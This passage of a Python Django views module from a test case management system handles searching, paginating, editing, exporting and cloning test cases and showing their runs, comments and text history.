                                                 self.plan.plan_id))

                    return HttpResponseRedirect(
                        reverse('testcases-get', args=[self.case.pk]))

                def _returntoplan(self):
                    if not self.plan:
                        raise Http404

                    return HttpResponseRedirect(
                        '%s#reviewcases' % reverse('test_plan_url_short',
                                                   args=[self.plan.pk]))

            # Genrate the instance of actions
            ras = ReturnActions(case=tc, plan=tp)
            for ra_str in ras.__all__:
                if request.POST.get(ra_str):
                    func = getattr(ras, ra_str)
                    break
            else:
                func = ras._returntocase

            # Get the function and return back
            result = func()
            if isinstance(result, HttpResponseRedirect):
                return result
            else:
                # Assume here is the form
                form = result

    # Initial NewCaseForm for submit
    else:
        tp = plan_from_request_or_none(request)
        form = NewCaseForm(initial=default_form_parameters)
        if tp:
            form.populate(product_id=tp.product_id)

    context_data = {
        'test_plan': tp,
        'form': form
    }
    return render(request, template_name, context_data)


def get_testcaseplan_sortkey_pk_for_testcases(plan, tc_ids):
    """"""Get each TestCase' sortkey and related TestCasePlan's pk""""""
    qs = TestCasePlan.objects.filter(case__in=tc_ids)
    if plan is not None:
        qs = qs.filter(plan__pk=plan.pk)
    qs = qs.values('pk', 'sortkey', 'case')
    return dict([(item['case'], {
        'testcaseplan_pk': item['pk'],
        'sortkey': item['sortkey']
    }) for item in qs])


def calculate_number_of_bugs_for_testcases(tc_ids):
    """"""Calculate the number of bugs for each TestCase

    Arguments:
    - tc_ids: a list of tuple of TestCases' IDs
    """"""
    qs = Bug.objects.filter(case__in=tc_ids)
    qs = qs.values('case').annotate(total_count=Count('pk'))
    return dict([(item['case'], item['total_count']) for item in qs])


def calculate_for_testcases(plan, testcases):
    """"""Calculate extra data for TestCases

    Attach TestCasePlan.sortkey, TestCasePlan.pk, and the number of bugs of
    each TestCase.

    Arguments:
    - plan: the TestPlan containing searched TestCases. None means testcases
      are not limited to a specific TestPlan.
    - testcases: a queryset of TestCases.
    """"""
    tc_ids = [tc.pk for tc in testcases]
    sortkey_tcpkan_pks = get_testcaseplan_sortkey_pk_for_testcases(
        plan, tc_ids)
    num_bugs = calculate_number_of_bugs_for_testcases(tc_ids)

    # FIXME: strongly recommended to upgrade to Python +2.6
    for tc in testcases:
        data = sortkey_tcpkan_pks.get(tc.pk, None)
        if data:
            setattr(tc, 'cal_sortkey', data['sortkey'])
        else:
            setattr(tc, 'cal_sortkey', None)
        if data:
            setattr(tc, 'cal_testcaseplan_pk', data['testcaseplan_pk'])
        else:
            setattr(tc, 'cal_testcaseplan_pk', None)
        setattr(tc, 'cal_num_bugs', num_bugs.get(tc.pk, None))

    return testcases


def get_case_status(template_type):
    """"""Get part or all TestCaseStatus according to template type""""""
    confirmed_status_name = 'CONFIRMED'
    if template_type == 'case':
        d_status = TestCaseStatus.objects.filter(name=confirmed_status_name)
    elif template_type == 'review_case':
        d_status = TestCaseStatus.objects.exclude(name=confirmed_status_name)
    else:
        d_status = TestCaseStatus.objects.all()
    return d_status


@require_POST
def build_cases_search_form(request, populate=None, plan=None):
    """"""Build search form preparing for quering TestCases""""""
    # Initial the form and template
    action = request.POST.get('a')
    if action in TESTCASE_OPERATION_ACTIONS:
        search_form = SearchCaseForm(request.POST)
        request.session['items_per_page'] = \
            request.POST.get('items_per_page', settings.DEFAULT_PAGE_SIZE)
    else:
        d_status = get_case_status(request.POST.get('template_type'))
        d_status_ids = d_status.values_list('pk', flat=True)
        items_per_page = request.session.get('items_per_page',
                                             settings.DEFAULT_PAGE_SIZE)
        search_form = SearchCaseForm(initial={
            'case_status': d_status_ids,
            'items_per_page': items_per_page})

    if populate:
        if request.POST.get('product'):
            search_form.populate(product_id=request.POST['product'])
        elif plan and plan.product_id:
            search_form.populate(product_id=plan.product_id)
        else:
            search_form.populate()

    return search_form


def paginate_testcases(request, testcases):
    """"""Paginate queried TestCases

    Arguments:
    - request: django's HttpRequest from which to get pagination data
    - testcases: an object queryset representing already queried TestCases

    Return value: return the queryset for chain call
    """"""
    DEFAULT_PAGE_INDEX = 1

    POST = request.POST
    page_index = int(POST.get('page_index', DEFAULT_PAGE_INDEX))
    page_size = int(POST.get('items_per_page',
                             request.session.get('items_per_page',
                                                 settings.DEFAULT_PAGE_SIZE)))
    offset = (page_index - 1) * page_size
    return testcases[offset:offset + page_size]


def sort_queried_testcases(request, testcases):
    """"""Sort querid TestCases according to sort key

    Arguments:
    - request: REQUEST object
    - testcases: object of QuerySet containing queried TestCases
    """"""
    order_by = request.POST.get('order_by', 'create_date')
    asc = bool(request.POST.get('asc', None))
    tcs = order_case_queryset(testcases, order_by, asc)
    # default sorted by sortkey
    tcs = tcs.order_by('testcaseplan__sortkey')
    # Resort the order
    # if sorted by 'sortkey'(foreign key field)
    case_sort_by = request.POST.get('case_sort_by')
    if case_sort_by:
        if case_sort_by not in ['sortkey', '-sortkey']:
            tcs = tcs.order_by(case_sort_by)
        elif case_sort_by == 'sortkey':
            tcs = tcs.order_by('testcaseplan__sortkey')
        else:
            tcs = tcs.order_by('-testcaseplan__sortkey')
    return tcs


def query_testcases_from_request(request, plan=None):
    """"""Query TestCases according to criterias coming within REQUEST

    Arguments:
    - request: the REQUEST object.
    - plan: instance of TestPlan to restrict only those TestCases belongs to
      the TestPlan. Can be None. As you know, query from all TestCases.
    """"""
    search_form = build_cases_search_form(request)

    action = request.POST.get('a')
    if action == 'initial':
        # todo: build_cases_search_form will also check TESTCASE_OPERATION_ACTIONS
        # and return slightly different values in case of initialization
        # move the check there and just execute the query here if the data
        # is valid
        d_status = get_case_status(request.POST.get('template_type'))
        tcs = TestCase.objects.filter(case_status__in=d_status)
    elif action in TESTCASE_OPERATION_ACTIONS and search_form.is_valid():
        tcs = TestCase.list(search_form.cleaned_data, plan)
    else:
        tcs = TestCase.objects.none()

    # Search the relationship
    if plan:
        tcs = tcs.filter(plan=plan)

    tcs = tcs.select_related('author',
                             'default_tester',
                             'case_status',
                             'priority',
                             'category',
                             'reviewer')
    return tcs, search_form


def get_selected_testcases(request):
    """"""Get selected TestCases from client side

    TestCases are selected in two cases. One is user selects part of displayed
    TestCases, where there should be at least one variable named case, whose
    value is the TestCase Id. Another one is user selects all TestCases based
    on previous filter criterias even through there are non-displayed ones. In
    this case, another variable selectAll appears in the REQUEST. Whatever its
    value is.

    If neither variables mentioned exists, empty query result is returned.

    Arguments:
    - request: REQUEST object.
    """"""
    REQ = request.POST or request.GET
    if REQ.get('selectAll', None):
        plan = plan_from_request_or_none(request)
        cases, _search_form = query_testcases_from_request(request, plan)
        return cases
    else:
        pks = [int(pk) for pk in REQ.getlist('case')]
        return TestCase.objects.filter(pk__in=pks)


def load_more_cases(request, template_name='plan/cases_rows.html'):
    """"""Loading more TestCases""""""
    plan = plan_from_request_or_none(request)
    cases = []
    selected_case_ids = []
    if plan is not None:
        cases, _search_form = query_testcases_from_request(request, plan)
        cases = sort_queried_testcases(request, cases)
        cases = paginate_testcases(request, cases)
        cases = calculate_for_testcases(plan, cases)
        selected_case_ids = [tc.pk for tc in cases]
    context_data = {
        'test_plan': plan,
        'test_cases': cases,
        'selected_case_ids': selected_case_ids,
        'case_status': TestCaseStatus.objects.all(),
    }
    return render(request, template_name, context_data)


def get_tags_from_cases(case_ids, plan=None):
    """"""Get all tags from test cases

    @param cases: an iterable object containing test cases' ids
    @type cases: list, tuple

    @param plan: TestPlan object

    @return: a list containing all found tags with id and name
    @rtype: list
    """"""
    query = Tag.objects.filter(case__in=case_ids).distinct().order_by('name')
    if plan:
        query = query.filter(case__plan=plan)

    return query


@require_POST
def all(request):
    """"""
    Generate the TestCase list for the UI tabs in TestPlan page view.

    POST Parameters:
    from_plan: Plan ID
       -- [number]: When the plan ID defined, it will build the case
    page in plan.

    """"""
    # Intial the plan in plan details page
    tp = plan_from_request_or_none(request)
    if not tp:
        messages.add_message(request,
                             messages.ERROR,
                             _('TestPlan not specified or does not exist'))
        return HttpResponseRedirect(reverse('core-views-index'))

    tcs, search_form = query_testcases_from_request(request, tp)
    tcs = sort_queried_testcases(request, tcs)
    total_cases_count = tcs.count()

    # Get the tags own by the cases
    ttags = get_tags_from_cases((case.pk for case in tcs), tp)

    tcs = paginate_testcases(request, tcs)

    # There are several extra information related to each TestCase to be shown
    # also. This step must be the very final one, because the calculation of
    # related data requires related TestCases' IDs, that is the queryset of
    # TestCases should be evaluated in advance.
    tcs = calculate_for_testcases(tp, tcs)

    # generating a query_url with order options
    #
    # FIXME: query_url is always equivlant to None&asc=True whatever what
    # criterias specified in filter form, or just with default filter
    # conditions during loading TestPlan page.
    query_url = remove_from_request_path(request, 'order_by')
    asc = bool(request.POST.get('asc', None))
    if asc:
        query_url = remove_from_request_path(query_url, 'asc')
    else:
        query_url = '%s&asc=True' % query_url

    context_data = {
        'test_cases': tcs,
        'test_plan': tp,
        'search_form': search_form,
        # selected_case_ids is used in template to decide whether or not this TestCase is selected
        'selected_case_ids': [test_case.pk for test_case in get_selected_testcases(request)],
        'case_status': TestCaseStatus.objects.all(),
        'priorities': Priority.objects.all(),
        'case_own_tags': ttags,
        'query_url': query_url,

        # Load more is a POST request, so POST parameters are required only.
        # Remember this for loading more cases with the same as criterias.
        'search_criterias': request.body.decode(),
        'total_cases_count': total_cases_count,
    }
    return render(request, 'plan/get_cases.html', context_data)


@require_GET
def search(request, template_name='case/all.html'):
    """"""
    generate the function of searching cases with search criteria
    """"""
    search_form = SearchCaseForm(request.GET)
    if request.GET.get('product'):
        search_form.populate(product_id=request.GET['product'])
    else:
        search_form.populate()

    context_data = {
        'search_form': search_form,
    }
    return render(request, template_name, context_data)


@require_GET
def ajax_search(request, template_name='case/common/json_cases.txt'):
    """"""Generate the case list in search case and case zone in plan
    """"""
    tp = plan_from_request_or_none(request)

    action = request.GET.get('a')

    # Initial the form and template
    if action in ('search', 'sort'):
        search_form = SearchCaseForm(request.GET)
    else:
        # Hacking for case plan
        confirmed_status_name = 'CONFIRMED'
        # 'c' is meaning component
        template_type = request.GET.get('template_type')
        if template_type == 'case':
            d_status = TestCaseStatus.objects.filter(name=confirmed_status_name)
        elif template_type == 'review_case':
            d_status = TestCaseStatus.objects.exclude(name=confirmed_status_name)
        else:
            d_status = TestCaseStatus.objects.all()

        d_status_ids = d_status.values_list('pk', flat=True)

        search_form = SearchCaseForm(initial={'case_status': d_status_ids})

    # Populate the form
    if request.GET.get('product'):
        search_form.populate(product_id=request.GET['product'])
    elif tp and tp.product_id:
        search_form.populate(product_id=tp.product_id)
    else:
        search_form.populate()

    # Query the database when search
    if action in ('search', 'sort') and search_form.is_valid():
        tcs = TestCase.list(search_form.cleaned_data)
    elif action == 'initial':
        tcs = TestCase.objects.filter(case_status__in=d_status)
    else:
        tcs = TestCase.objects.none()

    # Search the relationship
    if tp:
        tcs = tcs.filter(plan=tp)

    tcs = tcs.select_related(
        'author',
        'default_tester',
        'case_status',
        'priority',
        'category'
    ).only(
        'case_id',
        'summary',
        'create_date',
        'is_automated',
        'is_automated_proposed',
        'case_status__name',
        'category__name',
        'priority__value',
        'author__username',
        'default_tester__id',
        'default_tester__username'
    )
    tcs = tcs.extra(select={'num_bug': RawSQL.num_case_bugs, })

    # columnIndexNameMap is required for correct sorting behavior, 5 should be
    # product, but we use run.build.product
    column_names = [
        '',
        '',
        'case_id',
        'summary',
        'author__username',
        'default_tester__username',
        'is_automated',
        'case_status__name',
        'category__name',
        'priority__value',
        'create_date',
    ]
    return ajax_response(request, tcs, column_names, template_name)


def ajax_response(request, queryset, column_names, template_name):
    """"""json template for the ajax request for searching""""""
    dt = DataTableResult(request.GET, queryset, column_names)

    # todo: prepare the JSON with the response, consider using :
    # from django.template.defaultfilters import escapejs
    json_result = render_to_string(
        template_name,
        dt.get_response_data(),
        request=request)
    return HttpResponse(json_result, content_type='application/json')


class SimpleTestCaseView(TemplateView, data.TestCaseViewDataMixin):
    """"""Simple read-only TestCase View used in TestPlan page""""""

    template_name = 'case/get_details.html'

    # NOTES: what permission is proper for this request?
    def get(self, request, case_id):
        self.case_id = case_id
        self.review_mode = request.GET.get('review_mode')
        return super(SimpleTestCaseView, self).get(request, case_id)

    def get_case(self):
        cases = TestCase.objects.filter(pk=self.case_id).only('notes')
        cases = list(cases.iterator())
        return cases[0] if cases else None

    def get_context_data(self, **kwargs):
        data = super(SimpleTestCaseView, self).get_context_data(**kwargs)

        case = self.get_case()
        data['test_case'] = case
        if case is not None:
            data.update({
                'review_mode': self.review_mode,
                'test_case_text': case.latest_text(),
                'logs': self.get_case_logs(case),
                'components': case.component.only('name'),
                'tags': case.tag.only('name'),
                'case_comments': self.get_case_comments(case),
            })

        return data


class TestCaseCaseRunListPaneView(TemplateView):
    """"""Display case runs list when expand a plan from case page""""""

    template_name = 'case/get_case_runs_by_plan.html'

    # FIXME: what permission here?
    def get(self, request, case_id):
        self.case_id = case_id

        plan_id = self.request.GET.get('plan_id', None)
        self.plan_id = int(plan_id) if plan_id is not None else None

        this_cls = TestCaseCaseRunListPaneView
        return super(this_cls, self).get(request, case_id)

    def get_case_runs(self):
        qs = TestCaseRun.objects.filter(case=self.case_id,
                                        run__plan=self.plan_id)
        qs = qs.values(
            'pk', 'case_id', 'run_id', 'case_text_version',
            'close_date', 'sortkey',
            'tested_by__username', 'assignee__username',
            'run__plan_id', 'run__summary',
            'case__category__name', 'case__priority__value',
            'case_run_status__name',
        ).order_by('pk')
        return qs

    def get_comments_count(self, caserun_ids):
        ct = ContentType.objects.get_for_model(TestCaseRun)
        qs = Comment.objects.filter(content_type=ct,
                                    object_pk__in=caserun_ids,
                                    site_id=settings.SITE_ID,
                                    is_removed=False)
        qs = qs.values('object_pk').annotate(comment_count=Count('pk'))
        result = {}
        for item in qs.iterator():
            result[int(item['object_pk'])] = item['comment_count']
        return result

    def get_context_data(self, **kwargs):
        this_cls = TestCaseCaseRunListPaneView
        data = super(this_cls, self).get_context_data(**kwargs)

        case_runs = self.get_case_runs()

        # Get the number of each caserun's comments, and put the count into
        # comments query result.
        caserun_ids = [item['pk'] for item in case_runs]
        comments_count = self.get_comments_count(caserun_ids)
        for case_run in case_runs:
            case_run['comments_count'] = comments_count.get(case_run['pk'], 0)

        data.update({
            'case_runs': case_runs,
        })
        return data


class TestCaseSimpleCaseRunView(TemplateView, data.TestCaseRunViewDataMixin):
    """"""Display caserun information in Case Runs tab in case page

    This view only shows notes, comments and logs simply. So, call it simple.
    """"""

    template_name = 'case/get_details_case_case_run.html'

    # what permission here?
    def get(self, request, case_id):
        try:
            self.caserun_id = int(request.GET.get('case_run_id', None))
        except (TypeError, ValueError):
            raise Http404

        this_cls = TestCaseSimpleCaseRunView
        return super(this_cls, self).get(request, case_id)

    def get_caserun(self):
        try:
            return TestCaseRun.objects.filter(
                pk=self.caserun_id).only('notes')[0]
        except IndexError:
            raise Http404

    def get_context_data(self, **kwargs):
        this_cls = TestCaseSimpleCaseRunView
        data = super(this_cls, self).get_context_data(**kwargs)

        caserun = self.get_caserun()
        logs = self.get_case_run_logs(caserun)
        comments = self.get_case_run_comments(caserun)

        data.update({
            'test_caserun': caserun,
            'logs': logs.iterator(),
            'comments': comments.iterator(),
        })
        return data


class TestCaseCaseRunDetailPanelView(TemplateView,
                                     data.TestCaseViewDataMixin,
                                     data.TestCaseRunViewDataMixin):
    """"""Display case run detail in run page""""""

    template_name = 'case/get_details_case_run.html'

    def get(self, request, case_id):
        self.case_id = case_id
        try:
            self.caserun_id = int(request.GET.get('case_run_id'))
            self.case_text_version = int(request.GET.get('case_text_version'))
        except (TypeError, ValueError):
            raise Http404

        this_cls = TestCaseCaseRunDetailPanelView
        return super(this_cls, self).get(request, case_id)

    def get_context_data(self, **kwargs):
        this_cls = TestCaseCaseRunDetailPanelView
        data = super(this_cls, self).get_context_data(**kwargs)

        try:
            qs = TestCase.objects.filter(pk=self.case_id)
            qs = qs.prefetch_related('component',
                                     'tag').only('pk')
            case = qs[0]

            qs = TestCaseRun.objects.filter(pk=self.caserun_id).order_by('pk')
            case_run = qs[0]
        except IndexError:
            raise Http404

        # Data of TestCase
        test_case_text = case.get_text_with_version(self.case_text_version)

        # Data of TestCaseRun
        caserun_comments = self.get_case_run_comments(case_run)
        caserun_logs = self.get_case_run_logs(case_run)

        caserun_status = TestCaseRunStatus.objects.values('pk', 'name')
        caserun_status = caserun_status.order_by('sortkey')
        bugs = group_case_bugs(case_run.case.get_bugs().order_by('bug_id'))

        data.update({
            'test_case': case,
            'test_case_text': test_case_text,

            'test_case_run': case_run,
            'comments_count': len(caserun_comments),
            'caserun_comments': caserun_comments,
            'caserun_logs': caserun_logs,
            'test_case_run_status': caserun_status,
            'grouped_case_bugs': bugs,
        })

        return data


def get(request, case_id):
    """"""Get the case content""""""
    # Get the case
    try:
        tc = TestCase.objects.select_related(
            'author', 'default_tester',
            'category', 'category',
            'priority', 'case_status').get(case_id=case_id)
    except ObjectDoesNotExist:
        raise Http404

    # Get the test plans
    tps = tc.plan.select_related('author', 'product', 'type').all()

    # log
    log_id = str(case_id)
    logs = TCMSLogModel.get_logs_for_model(TestCase, log_id)

    logs = itertools.groupby(logs, lambda l: l.date)
    logs = [(day, list(log_actions)) for day, log_actions in logs]
    try:
        tp = tps.get(pk=request.GET.get('from_plan', 0))
    except (TestPlan.DoesNotExist, ValueError):
        # ValueError is raised when from_plan is empty string
        # not viewing TC from a Plan or specified Plan does not exist (e.g. broken link)
        tp = None

    # Get the test case runs
    tcrs = tc.case_run.select_related(
        'run', 'tested_by',
        'assignee', 'case',
        'case', 'case_run_status').all()
    tcrs = tcrs.extra(select={
        'num_bug': RawSQL.num_case_run_bugs,
    }).order_by('run__plan')
    runs_ordered_by_plan = itertools.groupby(tcrs, lambda t: t.run.plan)
    # FIXME: Just don't know why Django template does not evaluate a generator,
    # and had to evaluate the groupby generator manually like below.
    runs_ordered_by_plan = [(k, list(v)) for k, v in runs_ordered_by_plan]
    case_run_plans = [k for k, v in runs_ordered_by_plan]
    # Get the specific test case run
    if request.GET.get('case_run_id'):
        tcr = tcrs.get(pk=request.GET['case_run_id'])
    else:
        tcr = None
    case_run_plan_id = request.GET.get('case_run_plan_id', None)
    if case_run_plan_id:
        for item in runs_ordered_by_plan:
            if item[0].pk == int(case_run_plan_id):
                case_runs_by_plan = item[1]
                break
            else:
                continue
    else:
        case_runs_by_plan = None

    # Get the case texts
    tc_text = tc.get_text_with_version(request.GET.get('case_text_version'))

    grouped_case_bugs = tcr and group_case_bugs(tcr.case.get_bugs())
    # Render the page
    context_data = {
        'logs': logs,
        'test_case': tc,
        'test_plan': tp,
        'test_plans': tps,
        'test_case_runs': tcrs,
        'case_run_plans': case_run_plans,
        'test_case_runs_by_plan': case_runs_by_plan,
        'test_case_run': tcr,
        'grouped_case_bugs': grouped_case_bugs,
        'test_case_text': tc_text,
        'test_case_status': TestCaseStatus.objects.all(),
        'test_case_run_status': TestCaseRunStatus.objects.all(),
        'bug_trackers': BugSystem.objects.all(),
    }
    return render(request, 'case/get.html', context_data)


@require_POST
def printable(request, template_name='case/printable.html'):
    """"""
        Create the printable copy for plan/case.
        Only CONFIRMED TestCases are printed when printing a TestPlan!
    """"""
    # search only by case PK. Used when printing selected cases
    case_ids = request.POST.getlist('case')
    case_filter = {'case__in': case_ids}

    test_plan = None
    # plan_pk is passed from the TestPlan.printable function
    # but it doesn't pass IDs of individual cases to be printed
    if not case_ids:
        plan_pk = request.POST.get('plan', 0)
        try:
            test_plan = TestPlan.objects.get(pk=plan_pk)
            # search cases from a TestPlan, used when printing entire plan
            case_filter = {
                'case__plan': plan_pk,
                'case__case_status': TestCaseStatus.objects.get(name='CONFIRMED').pk,
            }
        except (ValueError, TestPlan.DoesNotExist):
            test_plan = None

    tcs = create_dict_from_query(
        TestCaseText.objects.filter(**case_filter).values(
            'case_id', 'case__summary', 'setup', 'action', 'effect', 'breakdown'
        ).order_by('case_id', '-case_text_version'),
        'case_id',
        True
    )

    context_data = {
        'test_plan': test_plan,
        'test_cases': tcs,
    }
    return render(request, template_name, context_data)


@require_POST
def export(request, template_name='case/export.xml'):
    """"""Export the plan""""""
    case_pks = request.POST.getlist('case')
    context_data = {
        'data_generator': generator_proxy(case_pks),
    }

    response = render(request, template_name, context_data)

    response['Content-Disposition'] = \
        'attachment; filename=tcms-testcases-%s.xml' % datetime.datetime.now().strftime('%Y-%m-%d')
    return response


def generator_proxy(case_pks):
    metas = TestCase.objects.filter(
        pk__in=case_pks
    ).exclude(
        case_status__name='DISABLED'
    ).values(
        'case_id', 'summary', 'is_automated', 'notes',
        'priority__value', 'case_status__name',
        'author__email', 'default_tester__email',
        'category__name')

    component_dict = create_dict_from_query(
        TestCaseComponent.objects.filter(
            case__in=case_pks
        ).values(
            'case_id', 'component_id', 'component__name', 'component__product__name'
        ).order_by('case_id'),
        'case_id'
    )

    tag_dict = create_dict_from_query(
        TestCase.objects.filter(
            pk__in=case_pks
        ).values('case_id', 'tag__name').order_by('case_id'),
        'case_id'
    )

    plan_text_dict = create_dict_from_query(
        TestCaseText.objects.filter(
            case__in=case_pks
        ).values(
            'case_id', 'setup', 'action', 'effect', 'breakdown'
        ).order_by('case_id', '-case_text_version'),
        'case_id',
        True
    )

    for meta in metas:
        case_id = meta['case_id']
        c_meta = component_dict.get(case_id, None)
        if c_meta:
            meta['c_meta'] = c_meta

        tag = tag_dict.get(case_id, None)
        if tag:
            meta['tag'] = tag

        plan_text = plan_text_dict.get(case_id, None)
        if plan_text:
            meta['latest_text'] = plan_text

        yield meta


def update_testcase(request, tc, tc_form):
    """"""Updating information of specific TestCase

    This is called by views.edit internally. Don't call this directly.

    Arguments:
    - tc: instance of a TestCase being updated
    - tc_form: instance of django.forms.Form, holding validated data.
    """"""

    # Modify the contents
    fields = ['summary',
              'case_status',
              'category',
              'priority',
              'notes',
              'is_automated',
              'is_automated_proposed',
              'script',
              'arguments',
              'extra_link',
              'requirement',
              'alias']

    for field in fields:
        if getattr(tc, field) != tc_form.cleaned_data[field]:
            tc.log_action(request.user,
                          'Case %s changed from %s to %s in edit page.' % (
                              field, getattr(tc, field),
                              tc_form.cleaned_data[field]
                          ))
            setattr(tc, field, tc_form.cleaned_data[field])
    try:
        if tc.default_tester != tc_form.cleaned_data['default_tester']:
            tc.log_action(
                request.user,
                'Case default tester changed from %s to %s in edit page.' % (
                    tc.default_tester_id and tc.default_tester,
                    tc_form.cleaned_data['default_tester']
                ))
            tc.default_tester = tc_form.cleaned_data['default_tester']
    except ObjectDoesNotExist:
        pass
    tc.update_tags(tc_form.cleaned_data.get('tag'))
    try:
        fields_text = ['action', 'effect', 'setup', 'breakdown']
        latest_text = tc.latest_text()

        for field in fields_text:
            form_cleaned = tc_form.cleaned_data[field]
            if not (getattr(latest_text, field) or form_cleaned):
                continue
            if getattr(latest_text, field) != form_cleaned:
                tc.log_action(
                    request.user,
                    ' Case %s changed from %s to %s in edit page.' % (
                        field, getattr(latest_text, field) or None,
                        form_cleaned or None
                    ))
    except ObjectDoesNotExist:
        pass

    # FIXME: Bug here, timedelta from form cleaned data need to convert.
    tc.estimated_time = tc_form.cleaned_data['estimated_time']
    # IMPORTANT! tc.current_user is an instance attribute,
    # added so that in post_save, current logged-in user info
    # can be accessed.
    # Instance attribute is usually not a desirable solution.
    tc.current_user = request.user
    tc.save()


@permission_required('testcases.change_testcase')
def edit(request, case_id, template_name='case/edit.html'):
    """"""Edit case detail""""""
    try:
        tc = TestCase.objects.select_related().get(case_id=case_id)
    except ObjectDoesNotExist:
        raise Http404

    tp = plan_from_request_or_none(request)

    if request.method == ""POST"":
        form = EditCaseForm(request.POST)
        if request.POST.get('product'):
            form.populate(product_id=request.POST['product'])
        elif tp:
            form.populate(product_id=tp.product_id)
        else:
            form.populate()

        n_form = CaseNotifyForm(request.POST)

        if form.is_valid() and n_form.is_valid():

            update_testcase(request, tc, form)

            tc.add_text(author=request.user,
                        action=form.cleaned_data['action'],
                        effect=form.cleaned_data['effect'],
                        setup=form.cleaned_data['setup'],
                        breakdown=form.cleaned_data['breakdown'])

            # Notification
            update_case_email_settings(tc, n_form)

            # Returns
            if request.POST.get('_continue'):
                return HttpResponseRedirect('%s?from_plan=%s' % (
                    reverse('testcases-edit', args=[case_id, ]),
                    request.POST.get('from_plan', None),
                ))

            if request.POST.get('_continuenext'):
                if not tp:
                    raise Http404

                # find out test case list which belong to the same
                # classification
                confirm_status_name = 'CONFIRMED'
                if tc.case_status.name == confirm_status_name:
                    pk_list = tp.case.filter(
                        case_status__name=confirm_status_name)
                else:
                    pk_list = tp.case.exclude(
                        case_status__name=confirm_status_name)
                pk_list = list(pk_list.defer('case_id').values_list('pk', flat=True))
                pk_list.sort()

                # Get the previous and next case
                p_tc, n_tc = tc.get_previous_and_next(pk_list=pk_list)
                return HttpResponseRedirect('%s?from_plan=%s' % (
                    reverse('testcases-edit', args=[n_tc.pk, ]),
                    tp.pk,
                ))

            if request.POST.get('_returntoplan'):
                if not tp:
                    raise Http404
                confirm_status_name = 'CONFIRMED'
                if tc.case_status.name == confirm_status_name:
                    return HttpResponseRedirect('%s#testcases' % (
                        reverse('test_plan_url_short', args=[tp.pk, ]),
                    ))
                else:
                    return HttpResponseRedirect('%s#reviewcases' % (
                        reverse('test_plan_url_short', args=[tp.pk, ]),
                    ))

            return HttpResponseRedirect('%s?from_plan=%s' % (
                reverse('testcases-get', args=[case_id, ]),
                request.POST.get('from_plan', None),
            ))

    else:
        tctxt = tc.latest_text()
        # Notification form initial
        n_form = CaseNotifyForm(initial={
            'notify_on_case_update': tc.emailing.notify_on_case_update,
            'notify_on_case_delete': tc.emailing.notify_on_case_delete,
            'author': tc.emailing.auto_to_case_author,
            'default_tester_of_case': tc.emailing.auto_to_case_tester,
            'managers_of_runs': tc.emailing.auto_to_run_manager,
            'default_testers_of_runs': tc.emailing.auto_to_run_tester,
            'assignees_of_case_runs': tc.emailing.auto_to_case_run_assignee,
            'cc_list': CC_LIST_DEFAULT_DELIMITER.join(
                tc.emailing.get_cc_list()),
        })
        default_tester = tc.default_tester_id and tc.default_tester.\
            email or None
        form = EditCaseForm(initial={
            'summary': tc.summary,
            'default_tester': default_tester,
            'requirement': tc.requirement,
            'is_automated': tc.get_is_automated_form_value(),
            'is_automated_proposed': tc.is_automated_proposed,
            'script': tc.script,
            'arguments': tc.arguments,
            'extra_link': tc.extra_link,
            'alias': tc.alias,
            'case_status': tc.case_status_id,
            'priority': tc.priority_id,
            'product': tc.category.product_id,
            'category': tc.category_id,
            'notes': tc.notes,
            'component': [c.pk for c in tc.component.all()],
            'estimated_time': tc.estimated_time,
            'setup': tctxt.setup,
            'action': tctxt.action,
            'effect': tctxt.effect,
            'breakdown': tctxt.breakdown,
            'tag': ','.join(tc.tag.values_list('name', flat=True)),
        })

        form.populate(product_id=tc.category.product_id)

    context_data = {
        'test_case': tc,
        'test_plan': tp,
        'form': form,
        'notify_form': n_form,
    }
    return render(request, template_name, context_data)


def text_history(request, case_id, template_name='case/history.html'):
    """"""View test plan text history""""""

    tc = get_object_or_404(TestCase, case_id=case_id)
    tp = plan_from_request_or_none(request)
    tctxts = tc.text.values('case_id',
                            'case_text_version',
                            'author__email',
                            'create_date').order_by('-case_text_version')

    context_data = {
        'testplan': tp,
        'testcase': tc,
        'test_case_texts': tctxts.iterator(),
    }

    try:
        case_text_version = int(request.GET.get('case_text_version'))
        text_to_show = tc.text.filter(case_text_version=case_text_version)
        text_to_show = text_to_show.values('action',
                                           'effect',
                                           'setup',
                                           'breakdown')

        context_data.update({
            'select_case_text_version': case_text_version,
            'text_to_show': text_to_show.iterator(),
        })
    except (TypeError, ValueError):
        # If case_text_version is not a valid number, no text to display for a
        # selected text history
        pass

    return render(request, template_name, context_data)


@permission_required('testcases.add_testcase')
def clone(request, template_name='case/clone.html'):
    """"""Clone one case or multiple case into other plan or plans""""""

    request_data = getattr(request, request.method)

    if 'selectAll' not in request_data and 'case' not in request_data:
        messages.add_message(request,
                             messages.ERROR,
                             _('At least one TestCase is required'))
        # redirect back where we came from
        return HttpResponseRedirect(request.META.get('HTTP_REFERER', '/'))

    tp_src = plan_from_request_or_none(request)
    tp = None
    search_plan_form = SearchPlanForm()

    # Do the clone action
    if request.method == 'POST':
        clone_form = CloneCaseForm(request.POST)
        clone_form.populate(case_ids=request.POST.getlist('case'))

        if clone_form.is_valid():
            tcs_src = clone_form.cleaned_data['case']
            for tc_src in tcs_src:
                if clone_form.cleaned_data['copy_case']:
                    tc_dest = TestCase.objects.create(
                        is_automated=tc_src.is_automated,
                        is_automated_proposed=tc_src.is_automated_proposed,
                        script=tc_src.script,
                        arguments=tc_src.arguments,
                        extra_link=tc_src.extra_link,
                        summary=tc_src.summary,
                        requirement=tc_src.requirement,
                        alias=tc_src.alias,
                        estimated_time=tc_src.estimated_time,
                        case_status=TestCaseStatus.get_PROPOSED(),
                        category=tc_src.category,
                        priority=tc_src.priority,
                        notes=tc_src.notes,
                        author=clone_form.cleaned_data[
                            'maintain_case_orignal_author'] and
                        tc_src.author or request.user,
                        default_tester=clone_form.cleaned_data[
                            'maintain_case_orignal_default_tester'] and
                        tc_src.author or request.user,
                    )

                    for tp in clone_form.cleaned_data['plan']:
                        # copy a case and keep origin case's sortkey
                        if tp_src:
                            try:
                                tcp = TestCasePlan.objects.get(plan=tp_src,
                                                               case=tc_src)
                                sortkey = tcp.sortkey
                            except ObjectDoesNotExist:
                                sortkey = tp.get_case_sortkey()
                        else:
                            sortkey = tp.get_case_sortkey()

                        tp.add_case(tc_dest, sortkey)

                    tc_dest.add_text(
                        author=clone_form.cleaned_data[
                            'maintain_case_orignal_author'] and
                        tc_src.author or request.user,
                        create_date=tc_src.latest_text().create_date,
                        action=tc_src.latest_text().action,
                        effect=tc_src.latest_text().effect,
                        setup=tc_src.latest_text().setup,
                        breakdown=tc_src.latest_text().breakdown
                    )

